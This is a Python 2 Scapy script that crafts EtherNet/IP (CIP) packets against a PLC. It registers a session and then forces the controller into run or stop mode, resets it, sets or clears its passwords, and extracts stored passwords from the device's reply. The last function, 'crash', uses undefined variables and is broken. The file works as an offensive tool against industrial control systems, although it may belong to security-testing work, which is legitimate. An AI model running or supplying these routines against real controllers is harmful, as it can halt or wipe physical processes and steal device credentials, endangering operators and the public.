#! /usr/bin/env python
# coding:utf-8
from scapy.all import *
import random

# TODO: Rewrite this protocols
def ramdom_long():
    return random.randint(1, 65535)


class Send_RR_Data_Field(Packet):
    name = "Send_RR_Data"
    fields_desc = [LEShortField("Type", 0x0085),
                   FieldLenField(
                       "data_len", None, length_of="data", fmt="<H", adjust=lambda pkt, x:x),
                   StrLenField(
                       "data", "", length_from=lambda pkt: pkt.data_len)
                   ]


class Cmd_Data(Packet):
    name = "Cmd_Data"
    fields_desc = [XIntField("Interface", 0x00000000),
                   LEShortField("Timeout", 0x0003),
                   FieldLenField(
                       "ItemCount", None, fmt="<H", count_of="Items"),
                   PacketListField(
                       "Items", [], Send_RR_Data_Field(), count_from=lambda p:p.ItemCount)
                   ]


class Reg_Session_Data(Packet):
    name = "Register Session"
    fields_desc = [LEShortField("Version", 0x0001),
                   XShortField("Flags", 0x0000)]


class ENIP_Header(Packet):
    name = "ENIP_Header"
    fields_desc = [LEShortEnumField(
        "Command", 0x0004, {0x0004: "List Services", 0x0064: "List Interfaces", 0x0065: "Register Session", 0x006f: "Send RR Data"}),
        LEShortField("Length", None),
        XIntField("Session", 0x00000000),
        XIntField("Status", 0x00000000),
        StrFixedLenField(
            "SenderContext", '0000000000000000'.decode('hex'), length=8),
        XIntField("Options", 0x00000000)]

    def post_build(self, p, pay):
        if self.Length is None and pay:
            l = len(pay)
            p = p[:2] + struct.pack("<H", l) + p[4:]
        return p + pay


def create_socket(target_ip, target_port):
    """used to create socket

    Args:
        target_ip: PLC ipaddress
        target_port: PLC port

    return:
        socket
    """
    s = socket.socket()
    s.connect((target_ip, target_port))  # encapsulate into try/catch
    connection = StreamSocket(s, Raw)
    return connection


def create_connect(connection):
    """used to create connect with PLC

    Args:
        connection: socket which connect to PLC

    return:

    """

    response1 = connection.sr1(ENIP_Header())
    response2 = connection.sr1(ENIP_Header(Command=0x0064))
    return ENIP_Header(response1.load), ENIP_Header(response2.load)


def get_session(connection):
    """used to get cip session

    Args:
        connection: socket which connect to PLC

    return:

    """

    response = connection.sr1(ENIP_Header(Command=0x0065) / Reg_Session_Data())
    return ENIP_Header(response.load).Session


def send_RR_Data(connection, session, type1, data1, type2, data2):
    Context = '0b0000001087e900'.decode('hex')
    payload = ENIP_Header(Command=0x006f, Session=session,
                          SenderContext=Context) / Cmd_Data(ItemCount=2, Timeout=0x000a)
    payload.Items = [Send_RR_Data_Field(), Send_RR_Data_Field()]
    payload.Items[0].Type = type1
    payload.Items[0].data = data1
    payload.Items[1].Type = type2
    payload.Items[1].data = data2
    # payload.show2()
    response = connection.sr1(payload)
    return response


def start_plc(connection, session):
    type1 = 0x0081
    type2 = 0x0091
    data1 = "02".decode('hex')
    data2 = '0f0032008006'.decode('hex')  # run mode
    send_RR_Data(connection, session, type1, data1, type2, data2)


def stop_plc(connection, session):
    type1 = 0x0081
    type2 = 0x0091
    data1 = "02".decode('hex')
    data2 = '0f003c9c8001'.decode('hex')  # stop mode
    send_RR_Data(connection, session, type1, data1, type2, data2)


def clean_plc(connection, session):
    type1 = 0x0081
    type2 = 0x0091
    data1 = "02".decode('hex')
    data2 = '0f00000057'.decode('hex')  # reset mode1
    send_RR_Data(connection, session, type1, data1, type2, data2)
    data2 = '0f00000482ffff'.decode('hex')  # reset mode2
    send_RR_Data(connection, session, type1, data1, type2, data2)


def set_passwd(connection, session, passwd, type):
    type1 = 0x0081
    type2 = 0x0091
    data1 = "02".decode('hex')
    if type == 1:
        passwd_type = '0b00'
    elif type == 2:
        passwd_type = '1000'
    elif type == 3:
        passwd_type = '1500'

    if len(passwd) >= 10:
        passwd = passwd[:10]
    elif len(passwd) < 10:
        passwd = passwd + ('\x00' * (10 - len(passwd)))
    data2 = ('0f000500aa0a0003' + passwd_type).decode('hex') + passwd
    send_RR_Data(connection, session, type1, data1, type2, data2)


def clean_passwd(connection, session, type):
    type1 = 0x0081
    type2 = 0x0091
    data1 = "02".decode('hex')
    if type == 1:
        passwd_type = '0b00'
    elif type == 2:
        passwd_type = '1000'
    elif type == 3:
        passwd_type = '1500'
    data2 = ('0f000500aa0a0003' + passwd_type +
             '00000000000000000000').decode('hex')
    send_RR_Data(connection, session, type1, data1, type2, data2)


def get_passwd(connection, session):
    type1 = 0x0081
    type2 = 0x0091
    data1 = "02".decode('hex')
    data2 = "0f009e28a22c00000000".decode('hex')
    response = send_RR_Data(connection, session, type1, data1, type2, data2)
    passwd = ((response.load).encode('hex')[134:154]).decode('hex')
    main_passwd = ((response.load).encode('hex')[154:174]).decode('hex')
    if passwd == "\x00" * 10:
        passwd = "None"
    if main_passwd == "\x00" * 10:
        main_passwd = "None"
    return passwd, main_passwd


def crash(connection):
    response = send_RR_Data(connection, session, type1, data1, type2, data2)
